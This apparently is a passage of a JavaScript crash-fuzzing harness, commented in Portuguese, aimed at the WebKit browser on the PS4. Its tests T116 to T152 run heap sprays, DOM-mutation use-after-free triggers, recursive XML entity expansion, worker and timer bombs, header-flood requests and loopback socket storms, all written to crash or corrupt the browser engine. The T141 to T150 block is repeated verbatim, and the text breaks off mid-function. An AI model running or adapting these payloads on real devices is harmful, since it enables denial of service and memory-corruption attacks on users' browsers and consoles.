    log("Iniciando T116: Canvas 2D Path Explosion...");
    var c = document.createElement('canvas');
    c.width = 4096; c.height = 4096;
    var ctx = c.getContext('2d');
    
    if(ctx) {
        ctx.beginPath();
        var points = 100000;
        
        try {
            for(var i=0; i<points; i++) {
                ctx.lineTo(Math.random() * 4000, Math.random() * 4000);
                if(i % 1000 === 0) {
                    // Cria sub-caminhos complexos para estourar buffer de vértices
                    ctx.arc(2000, 2000, i/100, 0, Math.PI*2);
                    ctx.rect(i%100, i%100, 50, 50);
                }
            }
            ctx.fillStyle = "red";
            ctx.fill('evenodd'); 
            log(">> T116: Path rendered with " + points + " nodes.");
        } catch(e) { log(">> T116 GPU Panic: " + e.message); }
    }
}

function runTest117() {
    log("Iniciando T117: XHR Sync Blob Leak...");
    var blobs = [];
    var t = setInterval(function() {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", window.location.href, false);
        try {
            xhr.responseType = "blob"; 
            xhr.send();
            if(xhr.response) {
                blobs.push(xhr.response);
            }
            
            // Não libera os blobs, força o kernel a segurar handles de arquivos temp
            if(blobs.length > 500) {
                log(".. Blobs held: " + blobs.length);
                if(blobs.length > 5000) clearInterval(t);
            }
        } catch(e) {
            clearInterval(t);
            log(">> T117 FD Limit: " + e.message);
        }
    }, 10);
}

function runTest118() {
    log("Iniciando T118: LocalStorage Quota Thrasher...");
    localStorage.clear();
    var k = "key";
    var v = "x".repeat(1024*1024); 
    
    try {
        var i = 0;
        while(true) {
            localStorage.setItem(k + i, v);
            i++;
            // Tenta remover e adicionar imediatamente para causar fragmentação no DB
            if(i > 2) {
                localStorage.removeItem(k + (i-2));
                localStorage.setItem(k + (i-2), "small");
            }
            if(i > 100) break; 
        }
    } catch(e) {
        // Quando quota atingida, tenta operação massiva de replace
        try {
            localStorage.clear();
            var huge = "A".repeat(1024 * 1024 * 10);
            localStorage.setItem("KILL", huge);
        } catch(z) {}
        log(">> T118: Storage thrashing trigger.");
    }
}

function runTest119() {
    log("Iniciando T119: Nested Worker Bomber...");
    var code = `
        self.onmessage = function(e) {
            if(e.data > 0) {
                var w = new Worker(self.location.href); // Auto-referência falha em blob, mas...
                // Fallback para loop de memória se worker falhar
                var arr = new Uint32Array(100000);
            }
        };
    `;
    // Usa Blob URL para criar workers que criam workers (se suportado) ou consomem RAM
    var b = new Blob(["var i=0; setInterval(function(){i++; new Float64Array(10000);}, 10);"], {type:'text/javascript'});
    var url = URL.createObjectURL(b);
    var workers = [];
    
    try {
        for(var i=0; i<50; i++) {
            workers.push(new Worker(url));
        }
        setTimeout(function() {
            workers.forEach(w => w.terminate());
            log(">> T119: Worker bomb stop.");
        }, 4000);
        log(">> T119: 50 Workers launched.");
    } catch(e) { log(">> T119 Limit: " + e.message); }
}

function runTest120() {
    log("Iniciando T120: Iframe History State DoS...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    var count = 0;
    
    f.onload = function() {
        try {
            var w = f.contentWindow;
            var spam = setInterval(function() {
                for(var i=0; i<50; i++) {
                    w.history.pushState({id: i, junk: new Array(100).join("z")}, "t"+i, "/"+i);
                    count++;
                }
                if(count > 10000) {
                    clearInterval(spam);
                    document.body.removeChild(f);
                    log(">> T120: History flood finish. States: " + count);
                }
            }, 10);
        } catch(e) { log(">> T120 Erro: " + e.message); }
    };
    f.src = "about:blank";
}
function runTest121() {
    log("Iniciando T121: Message Port Transfer Race...");
    var c = new MessageChannel();
    var p1 = c.port1;
    var p2 = c.port2;
    var t = setInterval(function() {
        try {
            // Tenta transferir a porta para ela mesma enquanto posta mensagem
            // Isso estressa o mecanismo de serialização de portas do WebKit
            p1.postMessage("race", [p2]);
            var c_new = new MessageChannel();
            p2 = c_new.port2; 
            
            // Aloca buffers pequenos para forçar GC rápido nas portas antigas
            var trash = new Uint8Array(100);
        } catch(e) {
            clearInterval(t);
            log(">> T121 Race End: " + e.message);
        }
    }, 0);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T121: Port race stopped.");
    }, 2000);
}

function runTest122() {
    log("Iniciando T122: DOM Parser Recursive Entity...");
    var parser = new DOMParser();
    var xml = '<!DOCTYPE doc [ <!ENTITY x "foo"> <!ENTITY y "&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;"> ]>';
    xml += '<root>' + '&y;'.repeat(1000) + '</root>';
    
    try {
        var res = parser.parseFromString(xml, "text/xml");
        var str = new XMLSerializer().serializeToString(res);
        log(">> T122: Parsed Len: " + str.length);
        
        // Tenta acessar nodos profundos resultantes da expansão
        var walker = document.createTreeWalker(res, NodeFilter.SHOW_TEXT, null, false);
        var count = 0;
        while(walker.nextNode()) count++;
        log(".. Text nodes found: " + count);
    } catch(e) {
        log(">> T122 XML Limit: " + e.message);
    }
}

function runTest123() {
    log("Iniciando T123: Form Validation Bubble Trap...");
    var f = document.createElement('form');
    var i = document.createElement('input');
    i.required = true;
    f.appendChild(i);
    document.body.appendChild(f);
    
    i.addEventListener('invalid', function(e) {
        // Recursão dentro do evento de validação bloqueia a UI thread
        // e cria pressão no stack de eventos
        var div = document.createElement('div');
        div.innerHTML = "X".repeat(1000);
        f.appendChild(div);
        
        if(f.childNodes.length < 2000) {
            i.checkValidity(); 
        } else {
            document.body.removeChild(f);
        }
    });
    
    try {
        i.checkValidity();
        log(">> T123: Validation trap triggered.");
    } catch(e) { log(">> T123 Stack: " + e.message); }
}

function runTest124() {
    log("Iniciando T124: Selection Range Collapse Loop...");
    var s = window.getSelection();
    var d = document.createElement('div');
    d.textContent = "TestData".repeat(100);
    document.body.appendChild(d);
    
    try {
        var r = document.createRange();
        r.selectNode(d);
        s.addRange(r);
        
        for(var i=0; i<5000; i++) {
            // Colapso rápido seguido de extensão força recálculo de layout
            s.collapse(d, 0);
            s.extend(d.firstChild, i % 100);
            
            if(i % 100 === 0) {
                // Modifica o texto para invalidar os offsets da seleção
                d.firstChild.splitText(50);
                d.normalize();
            }
        }
        document.body.removeChild(d);
        log(">> T124: Selection collapse stress done.");
    } catch(e) { log(">> T124 Erro: " + e.message); }
}

function runTest125() {
    log("Iniciando T125: Text Node Data Replace Overflow...");
    var t = document.createTextNode("Start");
    var huge = "A".repeat(10000);
    
    try {
        for(var i=0; i<1000; i++) {
            // replaceData com offset móvel e tamanho crescente
            t.replaceData(0, 5, huge);
            // Corta para evitar estouro imediato de memória JS, focando no churn do buffer interno
            t.data = t.data.substring(0, 100); 
            
            if(i % 50 === 0) {
                var spray = new Uint32Array(0x100).fill(0x12345678);
            }
        }
        log(">> T125: Data replacement cycle finished.");
    } catch(e) { log(">> T125 Erro: " + e.message); }
}

function runTest126() {
    log("Iniciando T126: SetTimeout Heap Flood...");
    var timers = [];
    var count = 0;
    
    function flood() {
        // Cria milhares de timers com closures que seguram memória
        var junk = new Array(100).join("z"); 
        var id = setTimeout(function() {
            var use = junk + count; 
        }, 10000 + count); // Delay longo para acumular no heap do kernel
        timers.push(id);
        count++;
        
        if(count < 50000) {
            // Agenda múltiplos por ciclo de loop para velocidade
            setTimeout(flood, 0);
            setTimeout(flood, 0);
            setTimeout(flood, 0);
        } else {
            log(">> T126: 50k Timers queued.");
        }
    }
    flood();
}

function runTest127() {
    log("Iniciando T127: XHR Response Text OOM...");
    var reqs = [];
    var t = setInterval(function() {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", window.location.href, true);
        xhr.onreadystatechange = function() {
            if(this.readyState == 4) {
                // Duplica a resposta na memória várias vezes
                var s = this.responseText;
                var s2 = s + s + s + s; 
                this.temp = s2; 
            }
        };
        xhr.send();
        reqs.push(xhr);
        
        if(reqs.length > 500) {
            log(".. XHR Objects holding text: " + reqs.length);
            if(reqs.length > 2000) clearInterval(t);
        }
    }, 10);
}

function runTest128() {
    log("Iniciando T128: Canvas PutImageData Align Fail...");
    var c = document.createElement('canvas');
    c.width = 1023; // Largura não potência de 2/4/8 para testar alinhamento
    c.height = 1023;
    var ctx = c.getContext('2d');
    
    try {
        var buf = new Uint8ClampedArray(1023 * 1023 * 4);
        buf.fill(128);
        var img = new ImageData(buf, 1023, 1023);
        
        for(var i=0; i<100; i++) {
            ctx.putImageData(img, 0, 0);
            // Lê de volta com offset estranho
            var sub = ctx.getImageData(1, 1, 1000, 1000);
            
            if(i % 10 === 0) {
                // Aloca textura GPU concorrente
                var tempC = document.createElement('canvas');
                tempC.width = 2048; tempC.height = 2048;
                tempC.getContext('2d').fillRect(0,0,1,1);
            }
        }
        log(">> T128: Unaligned image data transfer done.");
    } catch(e) { log(">> T128 GPU Error: " + e.message); }
}

function runTest129() {
    log("Iniciando T129: Blob Slice Recursion Depth...");
    var base = new Blob(["start".repeat(1000)]);
    var curr = base;
    
    try {
        for(var i=0; i<1000; i++) {
            // Cria cadeia profunda de referências de Blob
            // Kernel precisa rastrear offset + parent para cada fatia
            curr = curr.slice(1, curr.size);
            
            if(i % 100 === 0) {
                var u = URL.createObjectURL(curr);
                // Não revoga URL para manter a cadeia viva
            }
        }
        log(">> T129: Blob slicing depth 1000 reached.");
    } catch(e) {
        log(">> T129 Limit: " + e.message);
    }
}

function runTest130() {
    log("Iniciando T130: Iframe Reload Memory Leak...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    var count = 0;
    
    f.onload = function() {
        count++;
        // Cria objetos grandes no contexto do frame antes de recarregar
        try {
            f.contentWindow.leak = new Array(100000).fill(1.2345);
            f.contentWindow.document.body.innerHTML = "<div></div>".repeat(2000);
        } catch(e){}
        
        if(count < 200) {
            f.contentWindow.location.reload();
        } else {
            document.body.removeChild(f);
            log(">> T130: Frame reload cycles: " + count);
        }
    };
    f.src = "about:blank";
}
function runTest131() {
    log("Iniciando T131: History State Cyclic Bomb...");
    var a = [];
    var b = {};
    for(var i=0; i<500; i++) {
        var o = {id: i, data: new Uint8Array(255).fill(i)}; 
        a.push(o);
        if(i % 50 === 0) b["k"+i] = a; 
    }
    a.push(b); 
    
    try {
        // Serialização profunda do WebKit tenta processar ciclos ou falha
        // Tamanhos ajustados para causar pressão no buffer de IPC
        history.pushState(a, "Title", "?len=" + a.length);
        log(">> T131: State pushed (Serialization heavy).");
        
        // Substituição rápida para forçar free() no objeto anterior
        setTimeout(function() {
            history.replaceState(null, null, null);
            var spray = new ArrayBuffer(1024 * 1024);
        }, 10);
    } catch(e) { log(">> T131 Serialization Error: " + e.message); }
}

function runTest132() {
    log("Iniciando T132: Message Channel Port Clone Loop...");
    var channel = new MessageChannel();
    var p1 = channel.port1;
    var p2 = channel.port2;
    var transferList = [];
    
    try {
        for(var i=0; i<100; i++) {
            var mc = new MessageChannel();
            transferList.push(mc.port1);
            transferList.push(mc.port2);
        }
        
        // Envia centenas de portas através de um único canal
        // O Kernel precisa duplicar os descritores de arquivo (file descriptors) para todas elas
        p1.postMessage("clone_attack", transferList);
        
        p2.onmessage = function(e) {
            var ports = e.ports;
            // Fecha metade e mantém metade para fragmentar a tabela de handles
            for(var j=0; j<ports.length; j+=2) {
                ports[j].close();
            }
            log(".. Ports processed: " + ports.length);
        };
        log(">> T132: Port bombing sent.");
    } catch(e) { log(">> T132 Kernel Limit: " + e.message); }
}

function runTest133() {
    log("Iniciando T133: Node Filter Re-entrancy Trap...");
    var d = document.createElement('div');
    d.innerHTML = "<span>A</span><b>B</b>".repeat(200);
    
    var ni = document.createNodeIterator(d, NodeFilter.SHOW_ELEMENT, {
        acceptNode: function(node) {
            if(node.tagName === 'B') {
                // Modifica o DOM durante a iteração do filtro
                // Isso é um vetor clássico de UAF em motores antigos
                d.innerHTML = ""; 
                var junk = document.createElement('img'); // Tenta ocupar memória liberada
                return NodeFilter.FILTER_ACCEPT;
            }
            return NodeFilter.FILTER_SKIP;
        }
    });
    
    try {
        while(ni.nextNode()) {} 
        log(">> T133: Iterator logic survived.");
    } catch(e) { log(">> T133 Crash Logic: " + e.message); }
}

function runTest134() {
    log("Iniciando T134: DOM Implementation Prototype Spray...");
    var proto = DOMImplementation.prototype;
    var originals = {};
    var props = ["createDocument", "createHTMLDocument", "createDocumentType"];
    
    try {
        // Hook nas funções nativas para inserir alocações
        props.forEach(function(p) {
            originals[p] = proto[p];
            proto[p] = function() {
                var arr = new Array(100);
                for(var i=0; i<100; i++) arr[i] = document.createTextNode("spray");
                return originals[p].apply(this, arguments);
            };
        });
        
        for(var i=0; i<500; i++) {
            document.implementation.createHTMLDocument("test" + i);
        }
        log(">> T134: Prototype hooks executed.");
    } catch(e) { log(">> T134 Erro: " + e.message); }
    
    // Restaura para não quebrar o log
    props.forEach(function(p) { proto[p] = originals[p]; });
}

function runTest135() {
    log("Iniciando T135: Text Encoder Stream Fragmentation...");
    var enc = new TextEncoder();
    var huge = "X".repeat(1024 * 1024);
    var store = [];
    
    try {
        for(var i=0; i<50; i++) {
            // Encode em pedaços grandes força alocações de buffer no heap do WebKit
            var u8 = enc.encode(huge);
            // Cria "fatias" (views) que apontam para o buffer original
            for(var j=0; j<10; j++) {
                store.push(u8.subarray(j*1000, (j+1)*1000));
            }
            // Dereferencia o buffer principal, mas mantém as views
            // O GC não pode liberar o buffer grande enquanto houver views
            u8 = null;
        }
        log(">> T135: Buffer views created: " + store.length);
    } catch(e) { log(">> T135 OOM: " + e.message); }
}

function runTest136() {
    log("Iniciando T136: Fetch API Keep-Alive Flood...");
    var count = 0;
    
    var t = setInterval(function() {
        // fetch com keepalive=true tenta manter a conexão aberta no nível do sistema
        // Enviando payload grande para encher buffers de socket
        var body = new Uint8Array(1024 * 64).fill(0x41);
        fetch("/", {
            method: "POST",
            body: body,
            keepalive: true
        }).catch(e => {});
        
        count++;
        if(count > 1000) {
            clearInterval(t);
            log(">> T136: Keep-alive flood stop.");
        }
    }, 5);
}

function runTest137() {
    log("Iniciando T137: Blob Slice Memory Mapping Fail...");
    var parts = [];
    for(var i=0; i<1000; i++) parts.push("part"+i);
    var b = new Blob(parts); // Blob fragmentado
    
    try {
        var slices = [];
        for(var j=0; j<5000; j++) {
            // Fatias pequenas e aleatórias
            var start = Math.floor(Math.random() * b.size);
            var end = start + 10;
            slices.push(b.slice(start, end));
        }
        
        // Tenta ler todas as fatias simultaneamente
        var fr = new FileReader();
        fr.readAsArrayBuffer(slices[slices.length-1]); 
        
        log(">> T137: Blob mapping table stressed.");
    } catch(e) { log(">> T137 Kernel Map Error: " + e.message); }
}

function runTest138() {
    log("Iniciando T138: Sync XHR Recursive Open...");
    var depth = 0;
    
    function recurse() {
        depth++;
        if(depth > 100) return;
        
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "/", false); // Sync
        xhr.onreadystatechange = function() {
            if(xhr.readyState === 4) {
                recurse(); // Recursão dentro do callback sync
            }
        };
        try { xhr.send(); } catch(e){}
    }
    
    try {
        recurse();
        log(">> T138: Sync recursion depth: " + depth);
    } catch(e) { log(">> T138 Stack/Net Error: " + e.message); }
}

function runTest139() {
    log("Iniciando T139: Worker Import Scripts DoS...");
    var scriptURL = URL.createObjectURL(new Blob(["while(1){}"], {type: 'application/javascript'}));
    var workers = [];
    
    try {
        for(var i=0; i<20; i++) {
            var b = new Blob([
                "try { importScripts('" + scriptURL + "'); } catch(e) {}"
            ], {type: 'application/javascript'});
            
            var w = new Worker(URL.createObjectURL(b));
            workers.push(w);
        }
        
        setTimeout(function() {
            workers.forEach(w => w.terminate());
            log(">> T139: ImportScripts load stop.");
        }, 3000);
        log(">> T139: Workers importing loops launched.");
    } catch(e) { log(">> T139 Error: " + e.message); }
}

function runTest140() {
    log("Iniciando T140: Iframe Src Javascript URI Loop...");
    var container = document.createElement('div');
    document.body.appendChild(container);
    var frames = [];
    
    var t = setInterval(function() {
        var f = document.createElement('iframe');
        // Javascript URI que cria um loop de navegação dentro do frame
        f.src = "javascript:window.location.reload()";
        container.appendChild(f);
        frames.push(f);
        
        if(frames.length > 50) {
            var dead = frames.shift();
            dead.src = "about:blank"; // Tenta cancelar navegação pendente
            container.removeChild(dead);
        }
        
        if(frames.length > 200) {
            clearInterval(t);
            log(">> T140: URI Loop cycle finished.");
        }
    }, 50);
}
function runTest141() {
    log("Iniciando T141: Custom Element Upgrade Race...");
    if(!window.customElements) { log(">> T141: API N/A, Fallback Mutation"); return; }
    
    class XCrusher extends HTMLElement {
        connectedCallback() {
            this.innerHTML = "A".repeat(1000);
            document.body.removeChild(this); 
            var spray = new Uint8Array(1000).fill(0x41);
        }
    }
    
    var container = document.createElement('div');
    document.body.appendChild(container);
    
    try {
        for(var i=0; i<500; i++) {
            var el = document.createElement('x-crusher');
            container.appendChild(el); 
        }
        
        customElements.define('x-crusher', XCrusher);
        
        for(var j=0; j<100; j++) {
            var el = document.createElement('x-crusher');
            container.appendChild(el);
        }
        log(">> T141: Element upgrades triggered.");
    } catch(e) { log(">> T141 Erro: " + e.message); }
}

function runTest142() {
    log("Iniciando T142: Readable Stream Tearing...");
    if(!window.ReadableStream) { log(">> T142: Stream API N/A"); return; }
    
    var buf = new Uint8Array(1024*1024);
    var stream = new ReadableStream({
        start(controller) {
            for(var i=0; i<100; i++) controller.enqueue(buf);
            controller.close();
        }
    });
    
    var reader = stream.getReader();
    var readLoop = function() {
        reader.read().then(function(res) {
            if(!res.done) {
                // Tenta cancelar enquanto lê
                if(Math.random() > 0.8) reader.cancel("Force Quit");
                readLoop();
            } else {
                log(">> T142: Stream read finish.");
            }
        }).catch(function(e) {
            var spray = new ArrayBuffer(0x10000); 
        });
    };
    readLoop();
}

function runTest143() {
    log("Iniciando T143: Shadow DOM Event Retargeting...");
    var host = document.createElement('div');
    if(!host.attachShadow) { log(">> T143: Shadow DOM N/A"); return; }
    
    var root = host.attachShadow({mode: 'open'});
    document.body.appendChild(host);
    
    var child = document.createElement('div');
    root.appendChild(child);
    
    var count = 0;
    host.addEventListener('test', function(e) {
        count++;
        // Modifica a estrutura do Shadow DOM durante o bubbling
        if(count % 2 === 0) {
            root.innerHTML = "";
            var junk = new Float64Array(1000);
        }
    });
    
    for(var i=0; i<1000; i++) {
        child.dispatchEvent(new Event('test', {bubbles: true, composed: true}));
        if(i % 100 === 0) root.appendChild(child); 
    }
    document.body.removeChild(host);
    log(">> T143: Event retargeting stress.");
}

function runTest144() {
    log("Iniciando T144: Proxy Revoke During Iteration...");
    var target = {};
    for(var i=0; i<5000; i++) target["p"+i] = i;
    
    var p = Proxy.revocable(target, {
        get: function(t, k) { return t[k]; }
    });
    
    try {
        var keys = Object.keys(p.proxy);
        keys.forEach(function(k, idx) {
            if(idx === 2500) {
                p.revoke(); 
                var fill = new Array(1000).fill(1); 
            }
            var val = p.proxy[k]; 
        });
    } catch(e) {
        log(">> T144 Proxy Error: " + e.message);
    }
}

function runTest145() {
    log("Iniciando T145: HTML Option Collection Setter...");
    var s = document.createElement('select');
    var opts = s.options;
    
    try {
        for(var i=0; i<1000; i++) {
            opts[i] = new Option("Opt" + i);
        }
        
        // Atribuição de length força realocação do buffer interno da coleção
        opts.length = 50000;
        
        for(var j=49900; j<50000; j++) {
            opts[j] = new Option("Far" + j);
        }
        
        opts.length = 0; 
        
        // Heap spray imediato
        var spray = [];
        for(var k=0; k<1000; k++) spray.push(new Uint32Array(16).fill(0x11223344));
        
        log(">> T145: Option collection thrashing done.");
    } catch(e) { log(">> T145 Erro: " + e.message); }
}

function runTest146() {
    log("Iniciando T146: FileReader Sync Blob Flood...");
    var readers = [];
    var data = new Uint8Array(1024*512).fill(65);
    
    try {
        for(var i=0; i<100; i++) {
            var b = new Blob([data]);
            var fr = new FileReader();
            // Dispara leitura e armazena referência
            fr.readAsArrayBuffer(b);
            readers.push(fr);
            
            // Sobrescreve referência do blob para forçar GC enquanto IO está pendente
            b = null;
            
            if(i % 20 === 0) {
                var junk = new ArrayBuffer(1024*1024);
            }
        }
        log(">> T146: IO Queue flooded.");
    } catch(e) { log(">> T146 Limit: " + e.message); }
}

function runTest147() {
    log("Iniciando T147: Huge Header XHR Attack...");
    var huge = "H".repeat(1024 * 32); 
    var xhr = new XMLHttpRequest();
    
    try {
        xhr.open("GET", "/", true);
        for(var i=0; i<200; i++) {
            // Tenta estourar o buffer de cabeçalhos HTTP do kernel
            xhr.setRequestHeader("X-Junk-" + i, huge);
        }
        xhr.send();
        log(">> T147: Headers sent. Len: " + (200 * 32) + "KB");
    } catch(e) {
        log(">> T147 Socket Error: " + e.message);
    }
}

function runTest148() {
    log("Iniciando T148: Recursive Blob Construction...");
    var layers = [];
    var base = new Blob(["base"]);
    layers.push(base);
    
    try {
        for(var i=0; i<500; i++) {
            // Blob construtor aceita arrays de blobs
            // Cria uma árvore de referência profunda
            var next = new Blob([layers[layers.length-1], layers[layers.length-1]]);
            layers.push(next);
            
            if(i % 50 === 0) log(".. Blob Depth: " + i);
        }
        
        var reader = new FileReader();
        reader.readAsText(layers[layers.length-1]);
        log(">> T148: Deep blob read triggered.");
    } catch(e) {
        log(">> T148 OOM/Limit: " + e.message);
    }
}

function runTest149() {
    log("Iniciando T149: Loopback Socket Connect Storm...");
    var frames = [];
    var portBase = 8080;
    
    var t = setInterval(function() {
        for(var i=0; i<20; i++) {
            // Cria iframes apontando para portas locais fechadas
            // Isso cria sockets no estado SYN_SENT que o kernel precisa gerenciar
            var f = document.createElement('iframe');
            f.src = "http://127.0.0.1:" + (portBase + i);
            document.body.appendChild(f);
            frames.push(f);
        }
        portBase += 20;
        
        if(frames.length > 500) {
            // Remove do DOM mas o socket pode ficar em TIME_WAIT
            while(frames.length > 0) document.body.removeChild(frames.pop());
        }
        
        if(portBase > 9000) {
            clearInterval(t);
            log(">> T149: Socket connect storm finished.");
        }
    }, 50);
}

function runTest150() {
    log("Iniciando T150: DOM Storage Transaction Lock...");
    localStorage.clear();
    
    // Tenta criar uma condição de corrida no arquivo de backing store do SQLite
    var t = setInterval(function() {
        try {
            var key = "k" + Math.random();
            var val = "v".repeat(1024);
            
            // Escrita Síncrona
            localStorage.setItem(key, val);
            
            // Leitura e remoção imediata
            var check = localStorage.getItem(key);
            localStorage.removeItem(key);
            
            // Dispara evento de storage para listeners (IPC stress)
            if(Math.random() > 0.9) localStorage.clear();
            
        } catch(e) {
            clearInterval(t);
            log(">> T150 IO Error: " + e.message);
        }
    }, 0);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T150: Storage lock test stop.");
    }, 3000);
}
function runTest141() {
    log("Iniciando T141: Custom Element Upgrade Race...");
    if(!window.customElements) { log(">> T141: API N/A, Fallback Mutation"); return; }
    
    class XCrusher extends HTMLElement {
        connectedCallback() {
            this.innerHTML = "A".repeat(1000);
            document.body.removeChild(this); 
            var spray = new Uint8Array(1000).fill(0x41);
        }
    }
    
    var container = document.createElement('div');
    document.body.appendChild(container);
    
    try {
        for(var i=0; i<500; i++) {
            var el = document.createElement('x-crusher');
            container.appendChild(el); 
        }
        
        customElements.define('x-crusher', XCrusher);
        
        for(var j=0; j<100; j++) {
            var el = document.createElement('x-crusher');
            container.appendChild(el);
        }
        log(">> T141: Element upgrades triggered.");
    } catch(e) { log(">> T141 Erro: " + e.message); }
}

function runTest142() {
    log("Iniciando T142: Readable Stream Tearing...");
    if(!window.ReadableStream) { log(">> T142: Stream API N/A"); return; }
    
    var buf = new Uint8Array(1024*1024);
    var stream = new ReadableStream({
        start(controller) {
            for(var i=0; i<100; i++) controller.enqueue(buf);
            controller.close();
        }
    });
    
    var reader = stream.getReader();
    var readLoop = function() {
        reader.read().then(function(res) {
            if(!res.done) {
                // Tenta cancelar enquanto lê
                if(Math.random() > 0.8) reader.cancel("Force Quit");
                readLoop();
            } else {
                log(">> T142: Stream read finish.");
            }
        }).catch(function(e) {
            var spray = new ArrayBuffer(0x10000); 
        });
    };
    readLoop();
}

function runTest143() {
    log("Iniciando T143: Shadow DOM Event Retargeting...");
    var host = document.createElement('div');
    if(!host.attachShadow) { log(">> T143: Shadow DOM N/A"); return; }
    
    var root = host.attachShadow({mode: 'open'});
    document.body.appendChild(host);
    
    var child = document.createElement('div');
    root.appendChild(child);
    
    var count = 0;
    host.addEventListener('test', function(e) {
        count++;
        // Modifica a estrutura do Shadow DOM durante o bubbling
        if(count % 2 === 0) {
            root.innerHTML = "";
            var junk = new Float64Array(1000);
        }
    });
    
    for(var i=0; i<1000; i++) {
        child.dispatchEvent(new Event('test', {bubbles: true, composed: true}));
        if(i % 100 === 0) root.appendChild(child); 
    }
    document.body.removeChild(host);
    log(">> T143: Event retargeting stress.");
}

function runTest144() {
    log("Iniciando T144: Proxy Revoke During Iteration...");
    var target = {};
    for(var i=0; i<5000; i++) target["p"+i] = i;
    
    var p = Proxy.revocable(target, {
        get: function(t, k) { return t[k]; }
    });
    
    try {
        var keys = Object.keys(p.proxy);
        keys.forEach(function(k, idx) {
            if(idx === 2500) {
                p.revoke(); 
                var fill = new Array(1000).fill(1); 
            }
            var val = p.proxy[k]; 
        });
    } catch(e) {
        log(">> T144 Proxy Error: " + e.message);
    }
}

function runTest145() {
    log("Iniciando T145: HTML Option Collection Setter...");
    var s = document.createElement('select');
    var opts = s.options;
    
    try {
        for(var i=0; i<1000; i++) {
            opts[i] = new Option("Opt" + i);
        }
        
        // Atribuição de length força realocação do buffer interno da coleção
        opts.length = 50000;
        
        for(var j=49900; j<50000; j++) {
            opts[j] = new Option("Far" + j);
        }
        
        opts.length = 0; 
        
        // Heap spray imediato
        var spray = [];
        for(var k=0; k<1000; k++) spray.push(new Uint32Array(16).fill(0x11223344));
        
        log(">> T145: Option collection thrashing done.");
    } catch(e) { log(">> T145 Erro: " + e.message); }
}

function runTest146() {
    log("Iniciando T146: FileReader Sync Blob Flood...");
    var readers = [];
    var data = new Uint8Array(1024*512).fill(65);
    
    try {
        for(var i=0; i<100; i++) {
            var b = new Blob([data]);
            var fr = new FileReader();
            // Dispara leitura e armazena referência
            fr.readAsArrayBuffer(b);
            readers.push(fr);
            
            // Sobrescreve referência do blob para forçar GC enquanto IO está pendente
            b = null;
            
            if(i % 20 === 0) {
                var junk = new ArrayBuffer(1024*1024);
            }
        }
        log(">> T146: IO Queue flooded.");
    } catch(e) { log(">> T146 Limit: " + e.message); }
}

function runTest147() {
    log("Iniciando T147: Huge Header XHR Attack...");
    var huge = "H".repeat(1024 * 32); 
    var xhr = new XMLHttpRequest();
    
    try {
        xhr.open("GET", "/", true);
        for(var i=0; i<200; i++) {
            // Tenta estourar o buffer de cabeçalhos HTTP do kernel
            xhr.setRequestHeader("X-Junk-" + i, huge);
        }
        xhr.send();
        log(">> T147: Headers sent. Len: " + (200 * 32) + "KB");
    } catch(e) {
        log(">> T147 Socket Error: " + e.message);
    }
}

function runTest148() {
    log("Iniciando T148: Recursive Blob Construction...");
    var layers = [];
    var base = new Blob(["base"]);
    layers.push(base);
    
    try {
        for(var i=0; i<500; i++) {
            // Blob construtor aceita arrays de blobs
            // Cria uma árvore de referência profunda
            var next = new Blob([layers[layers.length-1], layers[layers.length-1]]);
            layers.push(next);
            
            if(i % 50 === 0) log(".. Blob Depth: " + i);
        }
        
        var reader = new FileReader();
        reader.readAsText(layers[layers.length-1]);
        log(">> T148: Deep blob read triggered.");
    } catch(e) {
        log(">> T148 OOM/Limit: " + e.message);
    }
}

function runTest149() {
    log("Iniciando T149: Loopback Socket Connect Storm...");
    var frames = [];
    var portBase = 8080;
    
    var t = setInterval(function() {
        for(var i=0; i<20; i++) {
            // Cria iframes apontando para portas locais fechadas
            // Isso cria sockets no estado SYN_SENT que o kernel precisa gerenciar
            var f = document.createElement('iframe');
            f.src = "http://127.0.0.1:" + (portBase + i);
            document.body.appendChild(f);
            frames.push(f);
        }
        portBase += 20;
        
        if(frames.length > 500) {
            // Remove do DOM mas o socket pode ficar em TIME_WAIT
            while(frames.length > 0) document.body.removeChild(frames.pop());
        }
        
        if(portBase > 9000) {
            clearInterval(t);
            log(">> T149: Socket connect storm finished.");
        }
    }, 50);
}

function runTest150() {
    log("Iniciando T150: DOM Storage Transaction Lock...");
    localStorage.clear();
    
    // Tenta criar uma condição de corrida no arquivo de backing store do SQLite
    var t = setInterval(function() {
        try {
            var key = "k" + Math.random();
            var val = "v".repeat(1024);
            
            // Escrita Síncrona
            localStorage.setItem(key, val);
            
            // Leitura e remoção imediata
            var check = localStorage.getItem(key);
            localStorage.removeItem(key);
            
            // Dispara evento de storage para listeners (IPC stress)
            if(Math.random() > 0.9) localStorage.clear();
            
        } catch(e) {
            clearInterval(t);
            log(">> T150 IO Error: " + e.message);
        }
    }, 0);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T150: Storage lock test stop.");
    }, 3000);
}

// Helper para compatibilidade de prefixos no PS4
function reqFS(el) {
    if(el.requestFullscreen) el.requestFullscreen();
    else if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();
    else if(el.mozRequestFullScreen) el.mozRequestFullScreen();
    else if(el.msRequestFullscreen) el.msRequestFullscreen();
}

function exitFS() {
    if(document.exitFullscreen) document.exitFullscreen();
    else if(document.webkitExitFullscreen) document.webkitExitFullscreen();
}

function runTest151() {
    log("Iniciando T151: Fullscreen Toggle Race...");
    var el = document.createElement('div');
    document.body.appendChild(el);
    el.style.backgroundColor = "red";
    
    var t = setInterval(function() {
        try {
            // Tenta forçar condição de corrida no driver de vídeo
            // alternando estados antes da conclusão da animação
            reqFS(el);
            setTimeout(exitFS, 0); // Sai imediatamente na próxima tick
            
            // Cria lixo no DOM para ocupar thread de UI
            var s = document.createElement('span');
            s.innerHTML = "X";
            el.appendChild(s);
        } catch(e) {}
    }, 100);
    
    setTimeout(function() {
        clearInterval(t);
        document.body.removeChild(el);
        log(">> T151: Toggle race stopped.");
    }, 3000);
}

function runTest152() {
    log("Iniciando T152: Detached Node FS Request...");
    var el = document.createElement('div');
    // Nota: O elemento NÃO está no body (Detached)
    
    try {
        // Tentar FS em nodo desconectado pode causar null deref em WebKits antigos
        reqFS(el);
        
        // Conecta e desconecta rapidamente
